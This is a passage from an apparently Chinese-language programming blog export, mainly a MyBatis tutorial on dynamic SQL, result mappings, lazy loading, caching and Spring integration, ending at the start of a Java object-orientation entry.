<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectActiveBlogByTitle2&quot;</span>  <span class="attr">resultMap</span>=<span class="string">&quot;blogResultMap&quot;</span>&gt;</span></span><br><span class="line">    select * from blogs</span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;featured != null&quot;</span>&gt;</span></span><br><span class="line">            featured = #&#123;featured&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;title != null&quot;</span>&gt;</span></span><br><span class="line">            AND title like #&#123;title&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><p>可以使用set元素实现按需更新，指定具体需要更新的字段,set元素会动态前置 SET 关键字，同时也会删掉无关的逗号</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;updateById&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;dm.demo.project.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    update user</span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;username!=null <span class="symbol">&amp;amp;</span><span class="symbol">&amp;amp;</span> username!=&#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">            username=#&#123;username&#125;,</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;password!=null <span class="symbol">&amp;amp;</span><span class="symbol">&amp;amp;</span> password!=&#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">       		 password=#&#123;password&#125;,</span><br><span class="line">    	<span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">	where id= #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h2><p>foreach是对一个集合进行遍历，通常是在构建 IN 条件语句的时候。</p>
<ul>
<li><code>item</code>：集合的值</li>
<li><code>index</code>：集合的索引</li>
<li><code>collection</code>:指定传入单数的类型， List、Set、Map 对象或者数组对象等都可以传递给<em>foreach</em>作为集合参数</li>
<li><code>open</code>：指定开头</li>
<li><code>sepatator</code>：指定分隔符</li>
<li><code>close</code>：指定结尾</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryUserByIdList&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;list&quot;</span> 		            <span class="attr">resultType</span>=<span class="string">&quot;dm.demo.project.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    select *from user where id</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;list&quot;</span> <span class="attr">open</span>=<span class="string">&quot;in(&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">item</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">        #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h2><p>trim可以用于指定加入的前缀和指定自动去除的前面或后面的内容，它有下面四个属性</p>
<ul>
<li>prefix ：加入的前置名</li>
<li>suffix：加入的后缀名</li>
<li>prefixOverrides：自动去除前面的内容</li>
<li>suffiexOverrides：自动去除后面的内容</li>
</ul>
<p>where属性相当于：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">&quot;WHERE&quot;</span> <span class="attr">prefixOverrides</span>=<span class="string">&quot;AND |OR &quot;</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>set属性相当于:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">&quot;SET&quot;</span> <span class="attr">suffixOverrides</span>=<span class="string">&quot;,&quot;</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Sql-amp-include"><a href="#Sql-amp-include" class="headerlink" title="Sql &amp; include"></a>Sql &amp; include</h2><p>这个元素可以被用来定义可重用的 SQL 代码段，这些 SQL 代码可以被包含在其他语句中。它可以（在加载的时候）被静态地设置参数。 在不同的包含语句中可以设置不同的值到参数占位符上</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;columnBase&quot;</span>&gt;</span></span><br><span class="line">    id,title,author_id as authorId,featured,style</span><br><span class="line"><span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引用方式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectBlog&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Blog&quot;</span>&gt;</span></span><br><span class="line">    select </span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;columnBase&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">    from Blogs where id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="selectKey"><a href="#selectKey" class="headerlink" title="selectKey"></a>selectKey</h2><blockquote>
<p><code>&lt;selectKey&gt;</code> 为不支持自增的主键生成策略标签。</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertUUIDUser&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">parameterType</span>=<span class="string">&quot;dm.demo.project.pojo.UUIDUser&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">useGeneratedKeys</span>=<span class="string">&quot;true&quot;</span> <span class="attr">keyProperty</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">selectKey</span> <span class="attr">order</span>=<span class="string">&quot;BEFORE&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">keyProperty</span>=<span class="string">&quot;uuid_id&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        select uuid()</span><br><span class="line">    <span class="tag">&lt;/<span class="name">selectKey</span>&gt;</span></span><br><span class="line">    insert into uuid_user (uuid_id, uuid_detail) VALUES (#&#123;uuid_id&#125;,#&#123;uuid_detail&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="一对一association"><a href="#一对一association" class="headerlink" title="一对一association"></a>一对一association</h2><p>在需要进行关联查询的 mapper 中配置 <code>association</code> 节点，其有以下几个属性：</p>
<ul>
<li><code>property</code>：对应该实体类关联另一个实体类的变量名</li>
<li><code>column</code>：对应表的字段名</li>
<li><code>javaType</code>：对应关联的实体类</li>
<li><code>select</code>：指定子查询（注意要加入名称空间）</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--association 一对一关联查询 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getClass&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;ClassesResultMap&quot;</span>&gt;</span></span><br><span class="line">      select * from class c,teacher t where c.teacher_id=t.t_id and c.c_id=#&#123;id&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">&quot;com.lcb.user.Classes&quot;</span> <span class="attr">id</span>=<span class="string">&quot;ClassesResultMap&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 实体类的字段名和数据表的字段名映射 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;c_id&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;c_name&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;com.lcb.user.Teacher&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;t_id&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;t_name&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="一对多collection"><a href="#一对多collection" class="headerlink" title="一对多collection"></a>一对多collection</h2><p>在 mapper 文件中使用 <code>collection</code> 节点，其有以下几个属性：</p>
<ul>
<li><code>property</code>：对应表中的 commentsList</li>
<li><code>column</code>：当前表与外表关联的键（一般是id）</li>
<li><code>javaType</code>：对应 property 的类型</li>
<li><code>ofType</code>：对应外表的实体类</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--collection 一对多关联查询 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getClass2&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;ClassesResultMap2&quot;</span>&gt;</span></span><br><span class="line">        select * from class c,teacher t,student s where c.teacher_id=t.t_id </span><br><span class="line">        and c.c_id=s.class_id and c.c_id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">&quot;com.lcb.user.Classes&quot;</span> <span class="attr">id</span>=<span class="string">&quot;ClassesResultMap2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;c_id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;c_name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;teacher&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;com.lcb.user.Teacher&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;t_id&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;t_name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;student&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;com.lcb.user.Student&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;s_id&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> <span class="attr">column</span>=<span class="string">&quot;s_name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="延迟加载"><a href="#延迟加载" class="headerlink" title="延迟加载"></a>延迟加载</h2><blockquote>
<p>懒加载在子查询被查询到时才会加载</p>
<ul>
<li>积极延迟加载：只要获取任意属性内容，无论属性是否是关联表的内容，都会执行关联的表查询</li>
<li>非积极延迟加载：使用非延迟加载，只有当访问关联表数据时，才会执行关联表的查询。</li>
</ul>
</blockquote>
<p>Mybatis 仅支持 <code>association</code> 关联对象和 <code>collection</code> 关联集合对象的延迟加载,<code>association</code> 指的就是一对一，<code>collection</code> 指的就是一对多查询。在 Mybatis 配置文件中，可以配置是否启用延迟加载 <code>lazyLoadingEnabled=true|false</code>。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>使用 CGLIB 创建目标对象的代理对象，当调用目标方法时，进入拦截器方法，比如调用 <code>a.getB().getName()</code>，拦截器 <code>invoke()</code> 方法发现 <code>a.getB()</code> 是 null 值，那么就会单独发送事先保存好的查询关联 B 对象的 sql，把 B 查询上来，然后调用 <code>a.setB(b)</code>，于是 a 的对象 b 属性就有值了，接着完成 <code>a.getB().getName()</code> 方法的调用。这就是延迟加载的基本原理</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul>
<li>在setting中开启懒加载</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20201222112045311.png" alt="image-20201222112045311"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;queryUserAndOrdersByLazyLoadResultMap&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">type</span>=<span class="string">&quot;dm.demo.project.pojo.User&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">extends</span>=<span class="string">&quot;baseResultMap&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;orders&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">ofType</span>=<span class="string">&quot;dm.demo.project.pojo.Orders&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">select</span>=<span class="string">&quot;dm.demo.project.mapper.OrdersMapper.queryOrdersByUserId&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">column</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            select对应的子查询</span></span><br><span class="line"><span class="comment">                id: 外键</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryUserAndOrdersLazyLoad&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">resultMap</span>=<span class="string">&quot;queryUserAndOrdersByLazyLoadResultMap&quot;</span>&gt;</span></span><br><span class="line">        select *from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryOrdersByUserId&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">resultType</span>=<span class="string">&quot;dm.demo.project.pojo.Orders&quot;</span>&gt;</span></span><br><span class="line">        select *from orders where user_id=#&#123;userid&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testQueryUserAndOrdersLazyLoad</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List&lt;User&gt; users = userMapper.queryUserAndOrdersLazyLoad();</span><br><span class="line">        users.forEach(user -&gt; &#123;</span><br><span class="line">            System.out.println(user.getUsername());</span><br><span class="line">            List&lt;Orders&gt; orders = user.getOrders();</span><br><span class="line">            orders.forEach(System.out::println);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            if (user.getId()==1)&#123;</span></span><br><span class="line"><span class="comment">//                List&lt;Orders&gt; orders1 = user.getOrders();</span></span><br><span class="line"><span class="comment">//                orders1.forEach(System.out::println);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>



<p><strong>测试用例</strong></p>
<p>测试用例不通过</p>
<ul>
<li>1.方法本身异常</li>
<li>2.与预期不符合</li>
<li>3.预期跑异常，但是没跑</li>
<li>4.超时</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test(expected = ArithmeticException.class,timeout = 2000)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testQueryAllUserSuccess</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//        UUIDUser uuidUser = new UUIDUser(UUID.randomUUID().toString(), new Date().toString());</span></span><br><span class="line"><span class="comment">//        sqlSession.insert(&quot;insertUUIDUser&quot;,uuidUser);</span></span><br><span class="line"></span><br><span class="line">        List&lt;User&gt; users = userMapper.queryAllUser();</span><br><span class="line">        users.forEach(System.out::println);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断是否符合预期值</span></span><br><span class="line">        assertEquals(<span class="number">5</span>,users.size());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在所有测试用例执行之前有且执行一次</span></span><br><span class="line"><span class="comment">     * 一般用来初始化测试环境</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@BeforeClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setUpBeforeClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">         sessionFactory =</span><br><span class="line">                <span class="keyword">new</span> SqlSessionFactoryBuilder().build(Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  所有测试用例执行之前都会执行一次</span></span><br><span class="line"><span class="comment">     *  用来消除每个测试用例之间的影响</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUp</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        sqlSession = sessionFactory.openSession();</span><br><span class="line">        userMapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tearDown</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        sqlSession.commit();</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h1 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h1><p>Mybatis 中缓存分为一级缓存，二级缓存。通过缓存策略来减少数据库的查询次数，从而提 高性能。</p>
<h2 id="一级缓存"><a href="#一级缓存" class="headerlink" title="一级缓存"></a>一级缓存</h2><p>基于 <code>PerpetualCache</code>(永久缓存) 的 <code>HashMap</code> 本地缓存，其存储作用域为 <strong>SqlSession</strong>，当 Session flush 或 close 之后，该 Session 中的所有 Cache 就将清空。另外，如果在两次查询中间有增删改的操作，那么 MyBatis 就会重新刷新清空缓存区，那么下一次查询会重新执行 sql 语句<strong>默认打开一级缓存</strong>。</p>
<p>一级缓存是 SqlSession 范围的缓存，当调用 SqlSession 的修改，添加，删除，commit()，close()等方法时，就会清空一级缓存。</p>
<h2 id="二级缓存"><a href="#二级缓存" class="headerlink" title="二级缓存"></a>二级缓存</h2><p>二级缓存与一级缓存其机制相同，默认也是采用 <code>PerpetualCache</code>，HashMap 存储，不同在于其存储作用域为 <code>Mapper(Namespace)</code>，并且可自定义存储源，如 <code>Ehcache</code>。</p>
<p>默认不打开二级缓存，要开启二级缓存，使用二级缓存属性类需要实现 <code>Serializable</code> <strong>序列化接口</strong>(可用来保存对象的状态),在它的映射文件中配置 <code>&lt;cache/&gt;</code></p>
<p>二级缓存是 mapper 映射级别的缓存，多个 SqlSession 去操作<strong>同一个 Mapper 映射的 sql 语句</strong>，多个 SqlSession 可以共用二级缓存，二级缓存是跨 SqlSession 的。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--二级缓存--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置相关的Mapper映射文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    开启该Mapper映射文件对二级缓存的支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cache</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>开启statement的二级缓存</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryUserAndOrdersLazyLoad&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">resultMap</span>=<span class="string">&quot;queryUserAndOrdersByLazyLoadResultMap&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">useCache</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"># useCache为代表这个statement使用二级缓存</span><br><span class="line">        select *from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>或在mapper接口使用注解</p>
<p><img src="https://csn.damyoung.cn/image-20201222152106510.png" alt="image-20201222152106510"></p>
<h1 id="Spring整合Mybatis"><a href="#Spring整合Mybatis" class="headerlink" title="Spring整合Mybatis"></a>Spring整合Mybatis</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--整合mybatis配置文件到spring--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        整合dataSource数据源 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configuration&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            整合setting对象--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.ibatis.session.Configuration&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;lazyLoadingEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;aggressiveLazyLoading&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        扫描classpath下mapper文件夹中所有xml--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        整合mappers映射器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;mapperLocations&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath*:mappers/**/*.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        可以加载mybatis配置--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot;/&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    &lt;mybatis-spring:scan base-package=&quot;dm.demo.**.mapper&quot;/&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- DAO接口所在包名，Spring会自动查找其下的类 ,包下的类需要使用@MapperScan注解,否则容器注入会失败 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;basePackage&quot;</span> <span class="attr">value</span>=<span class="string">&quot;dm.demo.**.mapper&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sqlSessionFactoryBeanName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>MyBatis</category>
      </categories>
      <tags>
        <tag>spring</tag>
        <tag>Mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title>面向对象</title>
    <url>/2020/11/11/05%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<h3 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h3><p>类加载器：将class文件解析成jvm能够看懂的结构体—&gt;方法区</p>
<p>方法区，虚拟机栈，本地方法栈，堆，程序计数器</p>
<h3 id="一、关键字"><a href="#一、关键字" class="headerlink" title="一、关键字"></a>一、关键字</h3><h4 id="1、final"><a href="#1、final" class="headerlink" title="1、final"></a>1、final</h4><ul>
<li>修饰变量表示<strong>常量</strong> ，常量不能被二次赋值</li>
<li>修饰方法，表示方法不能<strong>被子类重写(</strong> override )</li>
<li>修饰类，表示类<strong>不能被继承</strong>extends</li>
</ul>
<p>fianl修饰的引用数据类型，可以对其对象属性进行更改，但不能对引用数据类型的变量进行修改，也就是不能让其指向另一个对象</p>
<p><strong>final只保证这个引用类型变量所引用的地址不会发生改变</strong></p>
<h4 id="2、static"><a href="#2、static" class="headerlink" title="2、static"></a>2、static</h4><blockquote>
<p>从属于类，随着类的加载而加载，优先于对象存在</p>
</blockquote>
<ul>
